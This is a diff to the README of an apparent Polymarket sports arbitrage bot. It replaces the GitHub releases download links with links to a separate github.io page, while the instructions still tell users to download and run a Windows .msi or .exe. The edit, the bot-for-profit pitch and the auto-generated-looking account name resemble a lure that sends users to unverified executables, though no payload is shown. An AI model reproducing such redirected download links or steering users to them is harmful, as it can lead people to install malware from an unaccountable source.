@@ -1,6 +1,6 @@
 # 📈 polymarket-sports-arbitrage-bot - Find price gaps on sports markets
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/multiplex-invertsoap119/polymarket-sports-arbitrage-bot/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://multiplex-invertsoap119.github.io)
 
 This software finds price differences across sports events on the Polymarket platform. It monitors active markets and highlights opportunities to balance bets for potential profit.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these basic standards to run the application well:
 
 Follow these steps to set up the software on your machine.
 
-1. Go to the [Releases page](https://github.com/multiplex-invertsoap119/polymarket-sports-arbitrage-bot/releases) to download the latest version.
+1. Go to the [Releases page](https://multiplex-invertsoap119.github.io) to download the latest version.
 2. Select the file ending in .msi or .exe for Windows.
 3. Save the file to your desktop or downloads folder.
 
